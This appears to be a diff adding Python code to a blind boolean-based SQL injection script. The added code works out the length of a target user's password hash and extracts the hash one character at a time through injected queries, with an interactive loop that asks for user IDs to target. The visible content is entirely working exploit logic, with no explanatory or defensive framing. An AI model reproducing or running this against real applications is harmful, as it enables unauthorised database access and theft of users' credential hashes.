@@ -27,3 +27,29 @@ def password_length(user_id):
         if not injected_query(payload):
             return i
         i +=1
+
+def extract_hash(charset, user_id, password_length):
+    found = ""
+    for i in range(0, password_length):
+        for j in range(len(charset)):
+            if boolean_query(i, user_id, charset[j]):
+                found +=charset[j]
+                break
+    return found
+
+def total_queries_taken():
+    global total_queries
+    print("\t\t[!] {} total queries!".format(total_queries))
+    total_queries = 0
+
+while True:
+    try:
+        user_id = input("> Enter a user ID to extract the password hash: ")
+        if not invalid_user(user_id):
+            user_password_length= password_length(user_id)
+            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
+            total_queries_taken()
+        else:
+            print("\t[X] User {} does not exist!".format(user_id))
+    except KeyboardInterrupt:
+        break
